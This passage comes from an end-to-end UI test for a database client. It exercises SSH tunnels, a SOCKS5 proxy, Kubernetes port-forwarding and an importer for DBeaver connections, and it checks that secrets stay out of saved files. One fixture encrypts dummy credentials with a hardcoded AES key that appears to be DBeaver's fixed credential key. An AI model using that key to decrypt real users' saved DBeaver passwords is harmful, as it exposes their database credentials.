        return r.left < box.left - 0.5 || r.right > box.right + 0.5;
      });
      const squeezed = visible.length > 0 && label.scrollWidth > label.clientWidth;
      return cut || squeezed ? [`${label.textContent}: ${cut ? "cut mark" : "squeezed name"}`] : [];
    }),
  );
  assert.deepEqual(badRows, []);
  // …and in its editor's toolbar, with the palette's own color for each theme.
  panel = await newQuery("Shop copy", "select count(*) as n from product;");
  const editorBadge = panel.locator('.toolbar .type-badge[data-connection-type="careful"]');
  assert.equal(await editorBadge.innerText(), "Careful");
  const badgeBackground = () => editorBadge.evaluate((el) => getComputedStyle(el).backgroundColor);
  const lightBackground = await badgeBackground();
  await setTheme("dark", "dark");
  assert.notEqual(await badgeBackground(), lightBackground);
  await setTheme("light", "light");
  // No stripes: the type is only the badge.
  assert.equal(await page.locator(".tabbar .tab.active").evaluate((el) => getComputedStyle(el).boxShadow.includes("inset")), false);
  // Every run asks first; cancelling runs nothing.
  await run(panel);
  const askFirst = page.getByRole("dialog", { name: "Run these statements?" });
  await askFirst.getByText("Shop copy asks before running anything").waitFor();
  assert.equal(await askFirst.locator(".risk-list li strong").innerText(), "Runs on a connection that asks before every run");
  await shot("13c-connection-type-confirm");
  await askFirst.getByRole("button", { name: "Cancel" }).click();
  await askFirst.waitFor({ state: "detached" });
  assert.equal(await panel.locator(".statusline", { hasText: "1 row" }).count(), 0);
  await run(panel);
  await page.getByRole("dialog", { name: "Run these statements?" }).getByRole("button", { name: "Run", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();

  step("SSH tunnel editor: two hops with keys, tested, used by a new connection");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("PG through wizard tunnel");
  await wizard.getByLabel("Host", { exact: true }).fill("postgres");
  await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
  await wizard.getByLabel("User", { exact: true }).fill("spelaion");
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("button", { name: "New profile…" }).click();
  const editor = page.getByRole("dialog", { name: "New network profile" });
  const key = join(root, "testing", "docker", "keys", "id_ed25519");
  await editor.getByLabel("Profile name").fill("Wizard bastions");
  await editor.getByRole("radio", { name: "Personal", exact: true }).check();
  await editor.getByLabel("Hop 1 Host").fill("127.0.0.1");
  await editor.getByLabel("Hop 1 Port").fill("2221");
  await editor.getByLabel("Hop 1 User").fill("spelaion");
  await editor.getByLabel("Hop 1 Authentication").selectOption("key");
  await editor.getByLabel("Hop 1 Private key file").fill(key);
  await editor.getByRole("button", { name: "+ Add hop" }).click();
  await editor.getByLabel("Hop 2 Host").fill("bastion2");
  await editor.getByLabel("Hop 2 User").fill("spelaion");
  await editor.getByLabel("Hop 2 Authentication").selectOption("key");
  await editor.getByLabel("Hop 2 Private key file").fill(key);
  // Tunnel-wide network settings: written to the file and used when testing.
  await editor.getByLabel("Keep-alive every (seconds)").fill("30");
  await editor.getByLabel("Give up after (unanswered)").fill("5");
  await editor.getByLabel("Connect timeout (seconds)").fill("20");
  await editor.getByRole("button", { name: "Test profile" }).click();
  // The bastions' fingerprints may already be known from the earlier step; accept any new one.
  await Promise.race([
    editor.locator(".test-result", { hasText: "Tunnel OK · 2 hops" }).waitFor(),
    (async () => {
      for (let i = 0; i < 2; i++) {
        await page.getByRole("button", { name: "Trust and remember" }).click({ timeout: 10_000 }).catch(() => {});
      }
      await editor.locator(".test-result", { hasText: "Tunnel OK · 2 hops" }).waitFor();
    })(),
  ]);
  await shot("14a-tunnel-editor");
  await editor.getByRole("button", { name: "Save", exact: true }).click();
  await editor.waitFor({ state: "detached" });
  assert.equal(await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).isChecked(), true);
  assert.equal(await wizard.getByLabel("Network profile", { exact: true }).inputValue(), "wizard-bastions");
  // A fixed local port: testing the connection goes through it.
  const localPort = await freePort();
  await wizard.getByLabel("Local port", { exact: true }).fill(String(localPort));
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "PG through wizard tunnel" }).waitFor();
  const tunnelFile = readFileSync(join(userDir, "tunnels", "wizard-bastions.toml"), "utf8");
  assert.equal(tunnelFile.match(/\[\[hops\]\]/g)?.length, 2, tunnelFile);
  assert.match(tunnelFile, /port = 2221/);
  assert.match(tunnelFile, /keepalive_interval = 30/);
  assert.match(tunnelFile, /keepalive_count = 5/);
  assert.match(tunnelFile, /connect_timeout = 20/);
  assert.doesNotMatch(tunnelFile, /password/);
  const throughTunnel = readdirSync(join(userDir, "connections"))
    .filter((name) => name.endsWith(".toml"))
    .map((name) => readFileSync(join(userDir, "connections", name), "utf8"))
    .find((text) => text.includes('tunnel = "wizard-bastions"'));
  assert.match(throughTunnel ?? "", new RegExp(`local_port = ${localPort}\\b`), throughTunnel);

  step("connection test: the failing step, its hint, network only, Stop and Copy diagnostics");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("Failing test");
  await wizard.getByLabel("Host", { exact: true }).fill("postgres");
  await wizard.getByLabel("Database", { exact: true }).fill("no_such_database");
  await wizard.getByLabel("User", { exact: true }).fill("spelaion");
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).check();
  await wizard.getByLabel("Network profile", { exact: true }).selectOption("wizard-bastions");
  // Through both bastions to the server, which has no such database: step 5 of 5.
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: "Failed at step 5: Database not found" }).waitFor();
  const log = wizard.locator(".test-log");
  assert.equal(await log.locator(".step.ok").count(), 4);
  await log.locator(".step.ok", { hasText: "SSH hop 2: " }).waitFor();
  await log.locator(".step.failed", { hasText: "does not exist" }).waitFor();
  await log.locator(".step.failed", { hasText: "check its name" }).waitFor();
  await shot("14b-connection-test-log");
  // The diagnostics come from the core, redacted: the password (here also the user's name)
  // is never in them.
  const diagnosticsBefore = await page.evaluate(() => window.__copied.length);
  await log.getByRole("button", { name: "Copy diagnostics" }).click();
  await page.waitForFunction((n) => window.__copied.length === n + 1, diagnosticsBefore);
  const diagnostics = await page.evaluate(() => window.__copied[window.__copied.length - 1]);
  assert.match(diagnostics, /Result: failed at step 5/);
  assert.match(diagnostics, /5\. \[FAILED\] Log in to postgres/);
  assert.match(diagnostics, /Hint: /);
  assert.doesNotMatch(diagnostics, /spelaion/);
  // Network only: the same route, without logging in.
  await wizard.getByRole("button", { name: "Test network only" }).click();
  await wizard.locator(".test-result", { hasText: "The network reaches the database" }).waitFor();
  assert.equal(await log.locator(".step").count(), 4);
  // Stop: a server that accepts the connection and never answers keeps the login waiting.
  const silentSockets = [];
  const silent = createServer((socket) => {
    silentSockets.push(socket);
    // Read (and drop) what arrives, so the client closing its end is noticed.
    socket.resume();
    socket.on("error", () => {});
  });
  silent.listen(0, "127.0.0.1");
  await once(silent, "listening");
  await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).uncheck();
  await wizard.getByRole("tab", { name: "Main" }).click();
  await wizard.getByLabel("Host", { exact: true }).fill("127.0.0.1");
  await wizard.getByLabel("Port", { exact: true }).fill(String(silent.address().port));
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await log.locator(".step.running", { hasText: "Log in to postgres" }).waitFor();
  await log.getByRole("button", { name: "Stop" }).click();
  await wizard.locator(".test-result", { hasText: "Stopped" }).waitFor();
  await log.locator(".step.stopped", { hasText: "Log in to postgres" }).waitFor();
  // Reaching the address opened and closed one connection; the stopped login's is closed too.
  assert.ok(silentSockets.length >= 2, `connections: ${silentSockets.length}`);
  await Promise.race([
    Promise.all(silentSockets.map((socket) => (socket.closed ? null : once(socket, "close")))),
    new Promise((_, fail) => setTimeout(() => fail(new Error("the stopped login left its connection open")), 10_000)),
  ]);
  silent.close();
  for (const socket of silentSockets) socket.destroy();
  await wizard.getByRole("button", { name: "Cancel" }).click();
  await wizard.waitFor({ state: "detached" });

  step("Settings → Network: a range of local ports for tunnels");
  await withSettings("network", async (settings) => {
    await settings.getByLabel("Lowest port").fill("20000");
    await settings.getByLabel("Highest port").fill("20100");
    await settings.getByRole("button", { name: "Use this range" }).click();
    await settings.getByRole("status").filter({ hasText: "Saved" }).waitFor();
  });
  const userToml = readFileSync(join(userDir, "user.toml"), "utf8");
  assert.match(userToml, /\[tunnels\]\s*port_min = 20000\s*port_max = 20100/, userToml);
  await withSettings("network", async (settings) => {
    const lowestPort = settings.getByLabel("Lowest port");
    await page.waitForFunction((input) => input.value === "20000", await lowestPort.elementHandle());
    await settings.getByRole("button", { name: "Any free port" }).click();
    await settings.getByRole("status").filter({ hasText: "Saved" }).waitFor();
  });
  assert.doesNotMatch(readFileSync(join(userDir, "user.toml"), "utf8"), /tunnels/);

  // While a connection uses it, the tunnel cannot be deleted.
  await (await connectionMenu("PG through wizard tunnel")).getByRole("button", { name: "Edit…" }).click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("button", { name: "Edit profile…" }).click();
  const editTunnel = page.getByRole("dialog", { name: "Edit network profile wizard-bastions" });
  assert.ok(await editTunnel.getByLabel("Profile name").isDisabled());
  assert.equal(await editTunnel.getByLabel("Hop 2 Host").inputValue(), "bastion2");
  assert.equal(await editTunnel.getByLabel("Keep-alive every (seconds)").inputValue(), "30");
  assert.equal(await editTunnel.getByLabel("Give up after (unanswered)").inputValue(), "5");
  assert.equal(await editTunnel.getByLabel("Connect timeout (seconds)").inputValue(), "20");
  await editTunnel.getByRole("button", { name: "Delete profile" }).click();
  await editTunnel.getByRole("button", { name: "Click again to delete" }).click();
  await editTunnel.locator(".test-result", { hasText: "PG through wizard tunnel" }).waitFor();
  await editTunnel.getByRole("button", { name: "Cancel" }).click();
  await editTunnel.waitFor({ state: "detached" });
  await wizard.getByRole("button", { name: "Cancel" }).click();
  await wizard.waitFor({ state: "detached" });
  assert.ok(existsSync(join(userDir, "tunnels", "wizard-bastions.toml")));

  step("a SOCKS5 proxy alone as the tunnel: its password asked, never stored in a file");
  const answerProxyPassword = async () => {
    const dialog = page.getByRole("dialog", { name: "Proxy password" });
    await dialog.waitFor();
    assert.match(await dialog.innerText(), /proxyuser@127\.0\.0\.1/);
    await dialog.locator("input").fill("proxy-pass");
    await dialog.locator("input").press("Enter");
    await dialog.waitFor({ state: "detached" });
  };
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("PG through proxy");
  await wizard.getByLabel("Host", { exact: true }).fill("postgres");
  await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
  await wizard.getByLabel("User", { exact: true }).fill("spelaion");
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("button", { name: "New profile…" }).click();
  const proxyEditor = page.getByRole("dialog", { name: "New network profile" });
  await proxyEditor.getByLabel("Profile name").fill("Corp proxy");
  await proxyEditor.getByRole("radio", { name: "Personal", exact: true }).check();
  await proxyEditor.getByRole("checkbox", { name: "Go through a SOCKS5 or HTTP proxy" }).check();
  await proxyEditor.getByLabel("Proxy host").fill("127.0.0.1");
  await proxyEditor.getByLabel("Port", { exact: true }).last().fill("11080");
  await proxyEditor.getByLabel("User", { exact: true }).last().fill("proxyuser");
  await proxyEditor.getByLabel("Proxy password", { exact: true }).fill("proxy-pass");
  // Not to the keychain: the smoke test never writes to the real one.
  await proxyEditor.getByRole("checkbox", { name: "Save the proxy password in the keychain" }).uncheck();
  // With a proxy, the only hop can go: the proxy alone reaches the database.
  await proxyEditor.getByRole("button", { name: "Remove Hop 1" }).click();
  await proxyEditor.getByRole("button", { name: "Test profile" }).click();
  await proxyEditor.locator(".test-result", { hasText: "Proxy OK" }).waitFor();
  await shot("14c-proxy-tunnel");
  await proxyEditor.getByRole("button", { name: "Save", exact: true }).click();
  await proxyEditor.waitFor({ state: "detached" });
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await answerProxyPassword();
  await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  const proxyFile = readFileSync(join(userDir, "tunnels", "corp-proxy.toml"), "utf8");
  assert.match(proxyFile, /\[proxy\]\s*type = "socks5"\s*host = "127\.0\.0\.1"\s*port = 11080\s*user = "proxyuser"/, proxyFile);
  assert.match(proxyFile, /secret = "prompt"/, proxyFile);
  assert.doesNotMatch(proxyFile, /proxy-pass|\[\[hops\]\]/, proxyFile);
  panel = await newQuery("PG through proxy", "select 'through the proxy' as route;");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for PG through proxy").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await answerProxyPassword();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();

  step("Settings → Network: network profiles listed, created, edited and deleted there");
  await withSettings("network", async (settings) => {
    const corp = settings.getByRole("listitem", { name: "corp-proxy" });
    await corp.waitFor();
    assert.match(await corp.innerText(), /socks5 127\.0\.0\.1:11080/);
    assert.match(await corp.innerText(), /Used by: PG through proxy/);
    assert.match(await settings.getByRole("listitem", { name: "wizard-bastions" }).innerText(), /spelaion@127\.0\.0\.1:2221 → spelaion@bastion2:22/);
    await shot("15b-network-profiles");
    await settings.getByRole("button", { name: "New network profile…" }).click();
    const spare = page.getByRole("dialog", { name: "New network profile" });
    await spare.getByLabel("Profile name").fill("Spare route");
    await spare.getByRole("radio", { name: "Personal", exact: true }).check();
    await spare.getByLabel("Hop 1 Host").fill("spare.example");
    await spare.getByLabel("Hop 1 User").fill("ops");
    await spare.getByRole("button", { name: "Save", exact: true }).click();
    await spare.waitFor({ state: "detached" });
    const row = settings.getByRole("listitem", { name: "spare-route" });
    await row.waitFor();
    assert.match(await row.innerText(), /Not used by any connection/);
    await row.getByRole("button", { name: "Edit…" }).click();
    const editSpare = page.getByRole("dialog", { name: "Edit network profile spare-route" });
    assert.equal(await editSpare.getByLabel("Hop 1 Host").inputValue(), "spare.example");
    await editSpare.getByRole("button", { name: "Delete profile" }).click();
    await editSpare.getByRole("button", { name: "Click again to delete" }).click();
    await editSpare.waitFor({ state: "detached" });
    await row.waitFor({ state: "detached" });
  });
  assert.ok(!existsSync(join(userDir, "tunnels", "spare-route.toml")));

  step("SQLite on a server: the server's sqlite3 through two hops, nothing copied");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.locator(".engine-card", { hasText: "SQLite" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("Shop on a server");
  assert.deepEqual(await wizard.getByRole("tab").allTextContents(), ["Main", "SSH", "Options"]);
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("button", { name: "New profile…" }).click();
  const serverTunnel = page.getByRole("dialog", { name: "New network profile" });
  await serverTunnel.getByLabel("Profile name").fill("File server");
  await serverTunnel.getByRole("radio", { name: "Personal", exact: true }).check();
  await serverTunnel.getByLabel("Hop 1 Host").fill("127.0.0.1");
  await serverTunnel.getByLabel("Hop 1 Port").fill("2221");
  await serverTunnel.getByLabel("Hop 1 User").fill("spelaion");
  await serverTunnel.getByLabel("Hop 1 Authentication").selectOption("key");
  await serverTunnel.getByLabel("Hop 1 Private key file").fill(key);
  await serverTunnel.getByRole("button", { name: "+ Add hop" }).click();
  await serverTunnel.getByLabel("Hop 2 Host").fill("sqlitehost");
  await serverTunnel.getByLabel("Hop 2 User").fill("spelaion");
  await serverTunnel.getByLabel("Hop 2 Authentication").selectOption("key");
  await serverTunnel.getByLabel("Hop 2 Private key file").fill(key);
  await serverTunnel.getByRole("button", { name: "Test profile" }).click();
  // bastion1 is known from earlier steps; the file server is new.
  await Promise.race([
    serverTunnel.locator(".test-result", { hasText: "Tunnel OK · 2 hops" }).waitFor(),
    (async () => {
      for (let i = 0; i < 2; i++) {
        await page.getByRole("button", { name: "Trust and remember" }).click({ timeout: 10_000 }).catch(() => {});
      }
      await serverTunnel.locator(".test-result", { hasText: "Tunnel OK · 2 hops" }).waitFor();
    })(),
  ]);
  await serverTunnel.getByRole("button", { name: "Save", exact: true }).click();
  await serverTunnel.waitFor({ state: "detached" });
  assert.equal(await wizard.getByRole("checkbox", { name: "The file is on a server: open it there through an SSH tunnel" }).isChecked(), true);
  await wizard.getByRole("tab", { name: "Main" }).click();
  // On a server, the field is the server's path and the local buttons are gone.
  assert.equal(await wizard.getByRole("button", { name: "Browse…" }).count(), 0);
  await wizard.getByLabel("File on the server", { exact: true }).fill("/home/spelaion/shop.db");
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 3\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  const remoteFile = readFileSync(join(userDir, "connections", "shop-on-a-server.toml"), "utf8");
  assert.match(remoteFile, /database = "\/home\/spelaion\/shop\.db"/);
  assert.match(remoteFile, /tunnel = "file-server"/);
  panel = await newQuery("Shop on a server", "select id, name, price from product order by id;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "3 rows" }).waitFor();
  await shot("14c-sqlite-on-a-server");

  // Only with the test cluster (testing/k8s): SPELAION_TEST_K8S is its kubeconfig.
  if (process.env.SPELAION_TEST_K8S) {
    step("Kubernetes tab: kubectl port-forward to a PostgreSQL inside the test cluster");
    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    wizard = page.locator(".modal.wizard").first();
    await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
    await wizard.getByLabel("Name", { exact: true }).fill("PG in Kubernetes");
    await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
    await wizard.getByLabel("User", { exact: true }).fill("spelaion");
    await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
    await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
    await wizard.getByRole("tab", { name: "Options" }).click();
    await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
    await wizard.getByRole("tab", { name: "Kubernetes" }).click();
    const kube = wizard.locator("#connection-tab-kubernetes");
    await kube.getByRole("checkbox", { name: "Connect through kubectl port-forward" }).check();
    await kube.getByLabel("Kubeconfig file").fill(process.env.SPELAION_TEST_K8S);
    await kube.getByLabel("Kubeconfig file").blur();
    // Every list comes from kubectl: contexts, namespaces, names of the type, ports.
    await kube.getByLabel("Context").locator("option", { hasText: "kind-spelaion-test" }).waitFor({ state: "attached" });
    await kube.getByLabel("Context").selectOption("kind-spelaion-test");
    await kube.getByLabel("Namespace").locator("option[value='spelaion-test']").waitFor({ state: "attached" });
    await kube.getByLabel("Namespace").selectOption("spelaion-test");
    await kube.getByLabel("Resource type").selectOption("pod");
    await kube.getByLabel("Resource name").locator("option", { hasText: /^postgres-/ }).first().waitFor({ state: "attached" });
    // A deployment's ports are its containers' ports, named after the container.
    await kube.getByLabel("Resource type").selectOption("deployment");
    await kube.getByLabel("Resource name").locator("option[value='postgres']").waitFor({ state: "attached" });
    await kube.getByLabel("Resource name").selectOption("postgres");
    await kube.getByLabel("Resource port").locator("option", { hasText: "5432 (postgres)" }).waitFor({ state: "attached" });
    assert.equal(await kube.getByLabel("Resource port").inputValue(), "5432");
    await kube.getByLabel("Resource type").selectOption("svc");
    await kube.getByLabel("Resource name").locator("option[value='postgres']").waitFor({ state: "attached" });
    await kube.getByLabel("Resource name").selectOption("postgres");
    await shot("14b-kubernetes-tab");
    // The SSH tunnel and Kubernetes exclude each other.
    await wizard.getByRole("tab", { name: "SSH" }).click();
    assert.equal(await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).isChecked(), false);
    await wizard.getByRole("button", { name: "Test connection" }).click();
    await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
    await wizard.getByRole("button", { name: "Save", exact: true }).click();
    await wizard.waitFor({ state: "detached" });
    const kubeFile = readFileSync(join(userDir, "connections", "pg-in-kubernetes.toml"), "utf8");
    assert.match(kubeFile, /\[kubernetes\]/);
    assert.match(kubeFile, /context = "kind-spelaion-test"/);
    assert.match(kubeFile, /namespace = "spelaion-test"/);
    assert.match(kubeFile, /resource = "svc\/postgres"/);
    assert.doesNotMatch(kubeFile, /^tunnel/m);

    // Editing shows the saved choice.
    await (await connectionMenu("PG in Kubernetes")).getByRole("button", { name: "Edit…" }).click();
    wizard = page.locator(".modal.wizard").first();
    await wizard.getByRole("tab", { name: "Kubernetes" }).click();
    const editKube = wizard.locator("#connection-tab-kubernetes");
    assert.equal(await editKube.getByRole("checkbox", { name: "Connect through kubectl port-forward" }).isChecked(), true);
    assert.equal(await editKube.getByLabel("Namespace").inputValue(), "spelaion-test");
    assert.equal(await editKube.getByLabel("Resource name").inputValue(), "postgres");
    await wizard.getByRole("button", { name: "Cancel" }).click();
    await wizard.waitFor({ state: "detached" });

    panel = await newQuery("PG in Kubernetes", "select current_database() as db, inet_server_port() as port;");
    await run(panel);
    await page.getByRole("dialog").getByText("Password for PG in Kubernetes").waitFor();
    await page.getByLabel("Password", { exact: true }).fill("spelaion");
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  }

  step("delete a connection: confirmation, its tab is left without a connection");
  await (await connectionMenu("Shop copy")).getByRole("button", { name: "Delete…" }).click();
  const confirm = page.getByRole("dialog", { name: "Delete connection?" });
  await confirm.getByText("only this computer is affected").waitFor();
  await shot("13b-delete-connection");
  await confirm.getByRole("button", { name: "Delete", exact: true }).click();
  await confirm.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "Shop copy" }).waitFor({ state: "detached" });
  assert.ok(!existsSync(join(userDir, "connections", "shop-copy.toml")));

  step("import from DBeaver: its files (made here, never the user's), passwords kept out");
  {
    // A DBeaver workspace like the one DBeaver writes, credentials encrypted the same way.
    const dbeaverDir = join(userDir, "dbeaver", "General", ".dbeaver");
    mkdirSync(dbeaverDir, { recursive: true });
    writeFileSync(
      join(dbeaverDir, "data-sources.json"),
      JSON.stringify({
        folders: {},
        connections: {
          "sqlite_jdbc-1": { provider: "sqlite", driver: "sqlite_jdbc", name: "Shop via DBeaver", configuration: { database: join(demo, "data", "shop.db"), type: "dev" } },
          "postgres-jdbc-2": { provider: "postgresql", driver: "postgres-jdbc", name: "Docker PG via DBeaver", configuration: { host: "127.0.0.1", port: "15432", database: "spelaion", type: "dev" } },
          "postgres-jdbc-3": {
            provider: "postgresql",
            driver: "postgres-jdbc",
            name: "PG behind bastion via DBeaver",
            configuration: {
              host: "postgres",
              port: "5432",
              database: "spelaion",
              type: "prod",
              handlers: { ssh_tunnel: { type: "TUNNEL", enabled: true, properties: { host: "127.0.0.1", port: 2221, authType: "PASSWORD" } } },
            },
          },
          "oracle_thin-4": { provider: "oracle", driver: "oracle_thin", name: "Old Oracle", configuration: { host: "ora", port: "1521" } },
        },
      }),
    );
    const credentials = JSON.stringify({
      "postgres-jdbc-2": { "#connection": { user: "spelaion", password: "spelaion" } },
      "postgres-jdbc-3": { "#connection": { user: "spelaion", password: "spelaion" }, "network/ssh_tunnel": { user: "tester", password: "not-saved" } },
    });
    const key = Buffer.from([0xba, 0xbb, 0x4a, 0x9f, 0x77, 0x4a, 0xb8, 0x53, 0xc9, 0x6c, 0x2d, 0x65, 0x3d, 0xfe, 0x54, 0x4a]);
    const iv = Buffer.alloc(16, 7);
    const cipher = createCipheriv("aes-128-cbc", key, iv);
    writeFileSync(join(dbeaverDir, "credentials-config.json"), Buffer.concat([iv, cipher.update(credentials), cipher.final()]));
    await page.evaluate((dir) => (window.__spelaionDbeaverDir = dir), join(userDir, "dbeaver"));

    await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
    await page.getByRole("button", { name: "Import from DBeaver…" }).click();
    const importer = page.locator(".modal.wizard");
    await importer.getByRole("heading", { name: "Import from DBeaver" }).waitFor();
    const list = importer.getByRole("list", { name: "DBeaver connections" });
    await list.getByRole("listitem").nth(3).waitFor();
    assert.ok(await list.getByRole("checkbox", { name: "Old Oracle" }).isDisabled());
    assert.ok(await list.getByRole("checkbox", { name: "Shop via DBeaver" }).isChecked());
    await list.getByRole("listitem").filter({ hasText: "PG behind bastion via DBeaver" }).getByText("SSH tester@127.0.0.1:2221").waitFor();
    await list.getByRole("listitem").filter({ hasText: "Docker PG via DBeaver" }).getByText("password saved", { exact: false }).waitFor();
    await importer.getByRole("radio", { name: "Personal", exact: true }).check();
    // Never the user's real keychain from the smoke test: passwords are asked instead.
    await importer.getByRole("checkbox", { name: "Store the passwords DBeaver saved in the system keychain" }).uncheck();
    await shot("13c-import-dbeaver");
    await importer.getByRole("button", { name: "Import 3 connections" }).click();
    await importer.getByRole("status").filter({ hasText: "Imported 3 connections. Created 1 network profile." }).waitFor();
    await shot("13d-import-dbeaver-done");
    await importer.getByRole("button", { name: "Done", exact: true }).click();
    await importer.waitFor({ state: "detached" });
    for (const name of ["Shop via DBeaver", "Docker PG via DBeaver", "PG behind bastion via DBeaver"]) {
      await page.locator(".connection-row", { hasText: name }).waitFor();
    }
    // Nothing secret in the new files; the SQLite one works right away.
    const files = ["shop-via-dbeaver.toml", "docker-pg-via-dbeaver.toml", "pg-behind-bastion-via-dbeaver.toml"].map((f) =>
      readFileSync(join(userDir, "connections", f), "utf8"),
    );
    assert.ok(files.every((text) => !text.includes("spelaion\"\npassword") && !text.includes("not-saved")));
    assert.ok(existsSync(join(userDir, "tunnels", "tester-127-0-0-1.toml")));
    panel = await newQuery("Shop via DBeaver", "select count(*) as products from product;");
    await run(panel);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await page.evaluate(() => delete window.__spelaionDbeaverDir);
  }

  step("history, theme and per-connection preference survive an app restart");
  await setLanguage("es");
  await setTheme("dark", "dark");
  await browser.close();
  if (process.env.SPELAION_TEST_K8S && process.platform === "win32") {
    // The Kubernetes connection is still open: closing the app stops its kubectl.
    assert.ok(testKubectls().length > 0, "the port-forward is running");
    await closeApp();
    assert.deepEqual(testKubectls(), [], "kubectl outlived the app");
  } else {
    await stopApp();
  }
  // While the app is closed, the repository changes as a `git pull` would (ADR-022).
  writeFileSync(shopFile, shopOriginal.replace("max_rows = 100", "max_rows = 50"));
  // And a personal connection whose file is a variable each person fills in (ADR-022).
  mkdirSync(join(userDir, "connections"), { recursive: true });
  writeFileSync(
    join(userDir, "connections", "vars-demo.toml"),
    'schema_version = 1\nname = "Personal vars"\nengine = "sqlite"\ndatabase = "${user.demo_db}"\n',
  );
  app = startApp();
  browser = await connect();
  page = browser.contexts()[0].pages()[0];
  page.setDefaultTimeout(30_000);
  await page.getByRole("button", { name: "Configuración", exact: true }).waitFor();
  assert.equal(await page.locator("html").getAttribute("lang"), "es");
  assert.equal(await page.locator("html").getAttribute("data-theme"), "dark");
  assert.equal(await savedLanguage(), "es");
  await setLanguage("en");
  await setTheme("system", systemTheme);
  await page.getByText("Shop (SQLite)", { exact: true }).waitFor();
  await page.locator(".connection-row", { hasText: "Docker PG (edited)" }).waitFor();
  assert.equal(await page.locator(".connection-row", { hasText: "Shop copy" }).count(), 0);
  assert.equal(await historySaving("Shop (SQLite)"), false);
  step("a repository connection changed since it was trusted is shown before it is used");
  // History saving is still off for this connection: this first run is not recorded.
  panel = await newQuery("Shop (SQLite)", "select 'history_resumed_marker' as resumed;");
  await run(panel);
  const change = page.getByRole("dialog", { name: "This changed since you trusted the repository" });
  await change.locator("tr", { hasText: "mcp.max_rows" }).filter({ hasText: "100" }).filter({ hasText: "50" }).waitFor();
  await change.getByText("the connection shop", { exact: false }).waitFor();
  await shot("10a-repository-change");
  await change.getByRole("button", { name: "Accept the change" }).click();
  await change.waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  history = page.getByRole("complementary", { name: "Query history", exact: true });
  await history.getByRole("textbox", { name: "Search query history" }).fill("round");
  await waitForHistoryCount(1);
  await history.locator(".history-sql", { hasText: "group by c.country" }).waitFor();
  await history.getByRole("textbox", { name: "Search query history" }).fill("private");
  await history.getByText("No matching queries.", { exact: true }).waitFor();
  await page.getByRole("button", { name: "Close query history" }).click();
  await setHistorySaving("Shop (SQLite)", true);
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
